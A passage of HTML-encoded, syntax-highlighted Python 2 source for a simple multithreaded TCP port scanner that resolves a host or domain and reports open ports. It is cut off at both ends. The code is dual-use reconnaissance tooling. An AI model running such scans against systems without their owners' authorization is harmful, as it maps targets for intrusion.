&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|  / __/ _ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;| | | |/ _ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;| '_ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;| __| __| | | | | '_ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; / _ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;| '__| __/ __|/ __/ _` | '_ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;  |&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;| | (_| (_) | |_| | (_) | | | | |_| |_| |_| | | |_) | (_) | |  | |_&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; (_| (_| | | | | |&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;___&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;___/ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;___/ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;___/|_| |_|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__|&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__, | | .__/ &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;___/|_|   &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__|___/&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;___&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__,_|_| |_| |&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|                                      |___/  |_|                                        |&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|                             Blog: https://co0ontty.github.io                           |&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;------------------------------------------------------------------------------------------&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Ip_scan_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setdefaulttimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;remote_server_ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gethostbyname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ip_target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect_ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote_server_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
			&lt;span class=&quot;n&quot;&gt;openPort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Domain_scan_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setdefaulttimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote_server_ip&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Ip_from_domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect_ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote_server_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
				&lt;span class=&quot;c1&quot;&gt;# Domain_res = str(remote_server_ip)+&quot;:&quot;+str(port)
&lt;/span&gt;				&lt;span class=&quot;n&quot;&gt;Domain_result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote_server_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;moreInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domainName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Ip_from_domain&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;Ip_from_domain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;domainNames&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gethostbyname_ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domainName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+]Start domain Scan&quot;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;domainNames&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Find : &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; IP :&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gethostbyname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;Ip_from_domain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gethostbyname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;Ip_from_domain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gethostbyname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;Ip_from_domain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ip_from_domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#去重
&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;start_domain_pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;start_IP_Pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;processes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;results&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ip_scan_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;openPort&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;start_domain_pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Start portscan on those IP from &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;startPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; to &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;processes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;results&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Domain_scan_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Domain_result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Find open port :&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optparse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OptionParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'python portscan.py -H 127.0.0.1 -P 60,90 -T 32 or python portscan.py -D www.baidu.com -P 60,90 -T 32 '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;co0ontty portscan version:1.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-H'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'--Host'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'host'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'store'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-P'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'--Port'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'port'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'1,10000'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-T'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'--Thread'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'thread'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span 